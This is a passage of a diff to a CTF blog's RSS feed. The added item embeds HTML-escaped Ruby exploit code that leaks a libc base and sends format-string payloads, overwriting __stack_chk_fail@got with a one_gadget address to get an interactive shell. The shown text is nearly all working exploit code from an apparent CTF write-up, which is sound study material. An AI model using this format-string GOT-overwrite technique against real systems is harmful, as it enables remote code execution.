+&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;libc base address = &lt;/span&gt;&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;#{&lt;/span&gt;libc_base&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_s(&lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;)&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
+
+one_gadget &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; libc_base &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0xf02a4&lt;/span&gt;
+high &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; (one_gadget &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0xffffffff00000000&lt;/span&gt;) &lt;span style=&#34;color:#666&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;32&lt;/span&gt;
+low &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; one_gadget &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0xffffffff&lt;/span&gt;
+llow &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; (low &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0xffff0000&lt;/span&gt;) &lt;span style=&#34;color:#666&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;
+hlow &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; low &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0xffff&lt;/span&gt;
+
+&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# Overwriting __stack_chk_fail@got to one gadget RCE&lt;/span&gt;
+payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;%&lt;/span&gt;&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;#{&lt;/span&gt;high&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;c%11$hnAAAABBBBBBB&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\x2c\x40\x40&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;
+
+payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;%&lt;/span&gt;&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;#{&lt;/span&gt;hlow&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;c%11$hnAAAABBBBBBB&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\x28\x40\x40&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;
+
+payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;%&lt;/span&gt;&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;#{&lt;/span&gt;llow&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;c%11$hnAAAABBBBBBB&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\x2a\x40\x40&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;
+
+&lt;span style=&#34;color:#800&#34;&gt;STDIN&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;gets
+payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;%4892c%11$hnAAAABBB%17$p&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\x18\x40\x40&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload
+
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;interact&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+    </item>
     <item>
       <title>VolgaCTF 2019 writeup</title>
       <link>https://owlinux1000.github.io/blog/post/volga2019/</link>
